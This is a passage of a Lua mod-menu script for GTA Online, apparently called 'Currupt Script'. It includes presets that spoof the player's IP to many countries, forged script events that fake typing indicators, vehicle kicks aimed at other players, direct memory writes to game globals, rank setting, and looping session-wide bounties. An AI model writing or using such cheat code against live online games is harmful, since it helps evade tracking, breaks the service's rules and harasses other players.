		menu.trigger_commands("spoofedip " .. "142.252.255." .. tostring(math.random(0, 127)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (RU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(127, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (JP)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.254." .. tostring(math.random(0, 127)))
	end)

	menu.divider(spoofpresets, "Residential IP Presets")

	menu.action(spoofpresets, "Russia", {}, "", function()
		sel = math.random(1,3)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "109.252." .. tostring(math.random(40, 45)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "92.100." .. tostring(math.random(178, 182)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "217.107." .. tostring(math.random(82, 98)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "95.24." .. tostring(math.random(0, 31)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "China", {}, "", function()
		menu.trigger_commands("spoofedip " .. "42.123." .. tostring(math.random(0, 31)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Australia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.168." .. tostring(math.random(40, 53)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Chicago", {}, "", function()
		menu.trigger_commands("spoofedip " .. "73.110." .. tostring(math.random(149, 151)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Baltimore", {}, "", function()
		menu.trigger_commands("spoofedip " .. "69.67." .. tostring(math.random(80, 95)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Texas", {}, "AT&T / IBM", function()
		menu.trigger_commands("spoofedip " .. "198.81.193." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Germany", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "84.56." .. tostring(math.random(218, 231)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "46.223." .. tostring(math.random(234, 251)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "93." .. tostring(math.random(192, 255)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "89.14." .. tostring(math.random(120, 124)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Italy", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "5.89." .. tostring(math.random(190, 197)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217.200." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Netherlands", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "217.123." .. tostring(math.random(124, 125)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217." .. tostring(math.random(100, 105)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "139.156." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "94.212." .. tostring(math.random(40, 47)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "France", {}, "", function()
		menu.trigger_commands("spoofedip " .. "2.10." .. tostring(math.random(134, 151)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "United Kingdom", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "81.109." .. tostring(math.random(120, 130)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217.33." .. tostring(math.random(88, 90)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "2.217." .. tostring(math.random(20, 30)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "86.0." .. tostring(math.random(54, 60)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Ireland", {}, "", function()
		menu.trigger_commands("spoofedip " .. "84.203." .. tostring(math.random(0, 10)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Switzerland", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "85.0." .. tostring(math.random(41, 43)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "84.73." .. tostring(math.random(0, 115)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Austria", {}, "", function()
		menu.trigger_commands("spoofedip " .. "194.166." .. tostring(math.random(250, 252)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Denmark", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "83.92." .. tostring(math.random(121, 124)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "87.104." .. tostring(math.random(64, 127)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Belgium", {}, "", function()
		menu.trigger_commands("spoofedip " .. "94.111." .. tostring(math.random(2, 4)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Spain", {}, "", function()
		menu.trigger_commands("spoofedip " .. "93.176." .. tostring(math.random(154, 155)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Portugal", {}, "", function()
		menu.trigger_commands("spoofedip " .. "94.61." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Norway", {}, "", function()
		menu.trigger_commands("spoofedip " .. "80.213." .. tostring(math.random(174, 181)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Finland", {}, "", function()
		menu.trigger_commands("spoofedip " .. "88.113." .. tostring(math.random(64, 83)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Sweden", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "78.72." .. tostring(math.random(240, 245)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "151.252." .. tostring(math.random(128, 172)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Slovakia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.64." .. tostring(math.random(50, 55)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Romania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "79.117." .. tostring(math.random(0, 127)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Poland", {}, "", function()
		sel = math.random(1,3)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "178.36." .. tostring(math.random(221, 229)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "193.17." .. tostring(math.random(174, 174)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "217." .. tostring(math.random(96, 99)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Czech Republic", {}, "", function()
		menu.trigger_commands("spoofedip " .. "185.91." .. tostring(math.random(164, 166)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Bulgaria", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.154." .. tostring(math.random(162, 164)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Slovenia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "77.111." .. tostring(math.random(53, 53)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Croatia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "185.133." .. tostring(math.random(132, 135)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Albania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "79.106." .. tostring(math.random(160, 191)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Lithuania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.140." .. tostring(math.random(13, 13)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Hungary", {}, "", function()
		menu.trigger_commands("spoofedip " .. "84.2." .. tostring(math.random(137, 137)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Greece", {}, "", function()
		menu.trigger_commands("spoofedip " .. "2.85." .. tostring(math.random(227, 227)) .. "." .. tostring(math.random(0, 255)))
	end)

ColorRepo = menu.list(misc, "Color Repository", {"colorrepo"}, "", function(); end)
BasicColors = menu.list(ColorRepo, "Basic Colors", {}, "", function(); end)
SecondaryColors = menu.list(ColorRepo, "Secondary Colors", {}, "", function(); end)

menu.action(BasicColors, "Red", {"red"}, "Copies a red hex value to your clipboard", function()
	util.copy_to_clipboard("ff0000")
end)

menu.action(BasicColors, "Green", {"green"}, "Copies a green hex value to your clipboard", function()
	util.copy_to_clipboard("00ff00")
end)

menu.action(BasicColors, "Blue", {"blue"}, "Copies a blue hex value to your clipboard", function()
	util.copy_to_clipboard("0000ff")
end)

menu.action(BasicColors, "Yellow", {"yellow"}, "Copies a yellow hex value to your clipboard", function()
	util.copy_to_clipboard("ffff00")
end)

menu.action(BasicColors, "Purple", {"purple"}, "Copies a purple hex value to your clipboard", function()
	util.copy_to_clipboard("800080")
end)

menu.action(BasicColors, "Orange", {"orange"}, "Copies an orange hex value to your clipboard", function()
	util.copy_to_clipboard("ffa500")
end)

menu.action(BasicColors, "White", {"white"}, "Copies a white hex value to your clipboard", function()
	util.copy_to_clipboard("ffffff")
end)

menu.action(BasicColors, "Black", {"black"}, "Copies a black hex value to your clipboard", function()
	util.copy_to_clipboard("000000")
end)

menu.action(SecondaryColors, "Magenta", {"magenta"}, "Magenta color for magenta menu", function()
	util.copy_to_clipboard("ff00FF")
end)

menu.action(SecondaryColors, "CEO of Crash", {"ceoofcrash"}, "The color I personally use, in case you wanted it", function()
	util.copy_to_clipboard("00ffa8")
end)


faketype = menu.list(misc, "Spoof Typing indicator", {}, "", function(); end)

menu.action(faketype, "Start Fake Typing", {}, "Will show a typing indicator above your nickname and also make other menus think that you're typing in chat", function()
	menu.trigger_commands("hidetyping off")
	for pids = 0, 31 do
		if players.exists(pids) and pids ~= players.user() then
			send_script_event(747270864, pids, {players.user(), pids, 6769})
		end
	end
end)

menu.action(faketype, "Stop Fake Typing", {}, "", function()
	for pids = 0, 31 do
		if players.exists(pids) and pids ~= players.user() then
			send_script_event(-990958325, pids, {players.user(), pids, 7556})
		end
	end
end)

menu.toggle(faketype, "Anti-Type", {}, "AKA 'Suppress Typing Indicator', hides the fact that you're typing", function(on)
	if on then
		menu.trigger_commands("hidetyping on")
	else
		menu.trigger_commands("hidetyping off")
	end
end)

menu.action(misc, "Fix Casino Heist", {}, "If you've bricked your casino heist by not doing the scoping mission, give this a try :)", function()
	STATS.STAT_SET_INT(util.joaat("MP0_H3OPT_POI"), 0, true)
	STATS.STAT_SET_INT(util.joaat("MP0_H3OPT_ACCESSPOINTS"), 0, true)
end)

menu.toggle_loop(misc, "Accept Joins", {}, "Automatically accept join screens", function() -- credits to jinx for letting me steal this
    local message_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if message_hash == 15890625 or message_hash == -398982408 or message_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(200)
    end
end)

menu.toggle_loop(misc, 'Increase Kosatka Missile Range', {'krange'}, 'You can use it anywhere in the map now', function ()
    if util.is_session_started() then
    memory.write_float(memory.script_global(262145 + 30176), 200000.0)
    end
end)

--[[menu.toggle(misc,"Player Bar", {"playerbar"}, "Turns on an overlay with a list of names and tags based on certain flags", function(on)
	if on then
		playerbar = true
	else
		playerbar = false
	end
end, false)]]

joining = false
menu.toggle(misc, "Player Joining Notifications", {}, "", function(on_toggle)
	if on_toggle then
		joining = true
	else
		joining = false
	end
end)

notification("Currupt Script has been successfully loaded!", colors.green)

async_http.init('pastebin.com', '/raw/j8iZnWjV', function(authver)
	if tonumber(authver) ~= version then -- why the fuck do i have to tonumber this when its literally already a number :waitwhat:
		util.toast(version .. " " .. authver)
		notification("Your using the BEST version of Currupt Script  available!", colors.red)
		menu.hyperlink(menu.my_root(), "Join Kwengz Server! #KWENGZ-IS-KING  #CANDY-FAX", "https://discord.gg/KHOS")
	end
end, function()
end)
async_http.dispatch()


local InitialPlayersList = players.list(true, true, true) -- Obtain list of players from Stand API
for i=1, #InitialPlayersList do -- Loop through the received player list
	GenerateFeatures(InitialPlayersList[i]) -- Generate Features for every player
end
InitialPlayersList = nil -- Discard the table as it is no longer needed (optional; most beginners will not do this)

players.on_join(function(pid)
	while true do
		if joining then
			notification(PLAYER.GET_PLAYER_NAME(pid) .. " joined", colors.red)
		end
		util.yield()
	end
end)

players.on_join(GenerateFeatures)
players.on_leave(update_leave)
players.on_join(update_join)
--util.on_stop(cleanup)

--for vehicle chaos
util.create_thread(function()
	while true do
		if (chaos) then
			vehicles = entities.get_all_vehicles_as_handles()
			cur_players = players.list(true,true,true)
			for k,v in pairs(vehicles) do
				driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(v, -1)
				if(PED.GET_PED_TYPE(driver) > 4) then
					VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(v, false, true)
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(v, speed)
					VEHICLE.SET_VEHICLE_GRAVITY(v, gravity)
				end
			end
		end
		util.yield()
	end
end)

	-- for car drifting
util.create_thread(function()
	while true do
		if drift then
			local veh = entities.get_user_vehicle_as_handle()
			if veh then
				if PAD.IS_CONTROL_PRESSED(1, 61) then
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, true)
				else
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
				end
			end        
		end
		util.yield()
	end
end)



--for oppressor blacklist
util.create_thread(function()
	while true do
		if kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("oppressor2")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield()
	end
end)

--[[
default = {
	["r"] = 255/255,
	["g"] = 255/255,
	["b"] = 255/255,
	["a"] = 255/255
} 
god = { -- need to find memory address
	["r"] = 255/255,
	["g"] = 175/255,
	["b"] = 0/255,
	["a"] = 255/255
} 
interior = { -- done
	["r"] = 150/255,
	["g"] = 150/255,
	["b"] = 150/255,
	["a"] = 255/255
} 
otr = { -- done
	["r"] = 0/255,
	["g"] = 255/255,
	["b"] = 255/255,
	["a"] = 255/255
}
host = {
	["r"] = 255/255,
	["g"] = 200/255,
	["b"] = 0/255,
	["a"] = 255/255
} 
dead = {
	["r"] = 175/255,
	["g"] = 100/255,
	["b"] = 100/255,
	["a"] = 255/255
} 
modder = {
	["r"] = 255/255,
	["g"] = 0/255,
	["b"] = 0/255,
	["a"] = 255/255
}  
friend = {
	["r"] = 0/255,
	["g"] = 255/255,
	["b"] = 0/255,
	["a"] = 255/255
}
spectating = {
	["r"] = 255/255,
	["g"] = 0/255,
	["b"] = 255/255,
	["a"] = 255/255
}


playerbar = false
util.create_thread(function() -- player bar
	while true do
		if playerbar then
			local PlayersList = players.list(true, true, true) 
			if #PlayersList < 11 then
				draw_box(0, 0, 1, 0.02, 0.5)
			elseif #PlayersList < 21 then
				draw_box(0, 0, 1, 0.036, 0.5)
			elseif #PlayersList < 31 then
				draw_box(0, 0, 1, 0.055, 0.5)
			else
				draw_box(0, 0, 1, 0.07, 0.5)
			end
			local posx = 0.001
			local posy = 0.001

			for _, pid in pairs (PlayersList) do 
				if true then
					local PlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
					local PlayerVehicle = PED.GET_VEHICLE_PED_IS_IN(PlayerPed, false)
					local color = default
					local tag = ""
					local getotr = memory.script_global(2689156 + (1 + (pid * 453)) + 209)
					local PlayerName = PLAYER.GET_PLAYER_NAME(pid)
					PlayerHandle = memory.alloc(13*4)
					NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, PlayerHandle, 13)
					
					if players.is_godmode(pid) then 
						tag = tag .. "[G]"
						color = god
					end
					if players.is_in_interior(pid) then
						tag = tag .. "[I]"
						color = interior
					end
					if memory.read_int(getotr) ==  1 then
						tag = tag .. "[O]"
						color = otr
					end
					if players.get_script_host() == pid then
						tag = tag .. "[SH]"
						color = host
					end
					if players.get_host() == pid then
						tag = tag .. "[H]"
						color = host
					end
					if PLAYER.IS_PLAYER_DEAD(pid) then
						tag = tag .. "[D]"
						color = dead
					end
					if players.is_marked_as_modder(pid) then
						tag = tag .. "[M]"
						color = modder
					end
					if NETWORK.NETWORK_IS_FRIEND(PlayerHandle) then
						tag = tag .. "[F]"
						color = friend
					end
					memory.free(PlayerHandle)

					directx.draw_text(posx, posy, PlayerName .. " " .. tag, ALIGN_TOP_LEFT, 0.4, color)
					posx = posx + 0.1
					if posx > 0.95 then
						posy = posy + 0.0175
						posx = 0.001
					end
				end
			end
		end
		util.yield()
	end
end)

]]

----------------------------------------------------------------------------------------------------------------


	menu.toggle(misc, "Rank 420", {"rank"}, "Note: If you save the profile with it toggled it will give you pemanant 420 rank", function(on_toggle)
		notification("Setting Rank 420...", colors.red)
		menu.trigger_commands("setrank" .. " 420")
	end)

	menu.toggle(misc, "Halloween FPS Boost", {"fpsboost"}, "Wait a few seconds for 5-10 FPS Boost.", function(on_toggle)
	if on_toggle then
		notification("Setting FPS...", colors.green)
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
    		menu.trigger_commands("noidlekick ")
    		menu.trigger_commands("noidlecam ")
	else
		notification("Resetting FPS...", colors.red)
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
    		menu.trigger_commands("noidlekick ")
    		menu.trigger_commands("noidlecam ")
		end
	end)

	menu.toggle(misc, "Halloween FPS Boost No Sky", {"fpsnsboost"}, "Wait a few seconds 10-15 FPS Boost.", function(on_toggle)
	if on_toggle then
		notification("Setting FPS...", colors.green)
		menu.trigger_commands("weather" .. " extrasunny")
		menu.trigger_commands("clouds" .. " clear01")
		menu.trigger_commands("time" .. " 6")
		menu.trigger_commands("superc")
    		menu.trigger_commands("potatomode ")
    		menu.trigger_commands("nosky ")
    		menu.trigger_commands("noidlekick ")
    		menu.trigger_commands("noidlecam ")
	else
		notification("Resetting FPS...", colors.red)
		menu.trigger_commands("weather" .. " normal")
		menu.trigger_commands("clouds" .. " normal")
    		menu.trigger_commands("potatomode ")
    		menu.trigger_commands("nosky ")
    		menu.trigger_commands("noidlekick ")
    		menu.trigger_commands("noidlecam ")
		end
	end)

bountyloop = menu.list(misc, "Bounty Loops", {}, "", function(); end)

--coded by MrWall 


util.show_corner_help("~s~Loaded ~o~ " .. SCRIPT_FILENAME .. " ~p~;)\n~s~Let's farm some ~g~$$$")

function on_stp()
	util.show_corner_help("~r~Unloaded ~o~ " .. SCRIPT_FILENAME .. "\n~s~Thanks for using ~p~:D")
end


local playerList = players.list(false, true, true)
local notify = false
local amount = {1000, 2000, 3000, 4000, 5000, 6000, 7000, 8000, 9000}
local randomamount = 10000


--Header
menu.divider(bountyloop, "Bounty Loops")

--Waiting time
delay = 30
menu.slider(bountyloop, "Repeat Colldown", {"bdelay"}, "Set the time on how long the script waits to give the next player a bounty (time is in sec)", 10, 300, delay, 5, function(value)
	delay = value
end)

--Random Amount
function random_pay()
	while randomamount <= 10000  do
		randomamount = amount[math.random(#amount)]
		util.yield(delay * 100)
	end
	return randomamount 
end

menu.toggle(bountyloop, "Random payout¿", {}, "Set random pay bounty loops\n\nActive = random", function(d)
	if d then
		random_pay()
	else
		randomamount = 10000
	end
end)

menu.toggle(bountyloop, "Notifications Off", {}, "By default notifications are turned OFF", function(on)
	if on then
		notify = true
		util.show_corner_help("~p~Notifications ~g~On")
	else
		notify = false
		util.show_corner_help("~p~Notifications ~r~Off")
	end
end)

--Bounty Toggle
menu.toggle_loop(bountyloop, "Start Loops", {}, "Will get a random players and give them bounty on set time", function()
	if #playerList > 0 then
		randomPlayer = players.get_name(playerList[math.random(1, #playerList)])
		menu.trigger_commands("bounty" .. randomPlayer .. " " .. randomamount)
		if notify then
			util.show_corner_help("~o~Bounty placed~y~... \n~r~$ ~w~= " .. randomamount)
			if not util.BEGIN_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED("~p~Notifications ~g~On") then
				util.show_corner_help("~o~Bounty placed~y~... \n~r~$ ~w~= " .. randomamount)
			end
		end
			util.yield(delay * 1000)
	else
		util.show_corner_help("Lobby has ~r~no ~w~other ~o~players.\n\n~w~Consider ~g~joining ~w~a ~g~new one.")
		util.yield(60000)
	end
end)

enabled = false
menu.toggle(bountyloop, "Infinite bountys Loop", {"infinibounty"}, "Places a 10k bounty on the entire session again and again.", function(on)
    if on then
        enabled = true
    else
        enabled = false
    end
end, false)

while true do
    if enabled then
        menu.trigger_commands("bountyall 10000")
    end
    util.yield(10000)
end
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
util.on_stop(function()
	notification("Later pussy (Yawn)", colors.red)
end)